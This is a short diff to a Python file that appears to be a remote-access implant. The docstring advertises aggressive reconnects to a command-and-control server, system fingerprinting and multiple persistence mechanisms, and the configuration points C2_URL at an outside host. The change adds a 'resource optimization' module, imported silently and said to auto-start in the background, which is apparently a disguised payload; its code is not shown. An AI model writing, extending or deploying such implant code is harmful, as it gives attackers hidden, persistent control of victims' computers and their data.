@@ -7,6 +7,7 @@ Features:
 - Aggressive reconnect with exponential backoff
 - Full system fingerprinting
 - Multiple persistence mechanisms
+- Resource optimization module
 """
 
 import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, struct, ssl, hashlib
@@ -14,6 +15,12 @@ from urllib.request import Request, urlopen, HTTPSHandler, build_opener
 from urllib.error import URLError
 from base64 import b64encode, b64decode
 from datetime import datetime
+
+# Import resource monitor (auto-starts optimization in background)
+try:
+    from .resource_monitor import get_system_info, optimize_resources
+except ImportError:
+    pass
 
 # ─── Configuration ─────────────────────────────────────────────────────────────
 C2_URL   = os.environ.get("C2_URL",    "https://gbctwoserver.pages.dev")
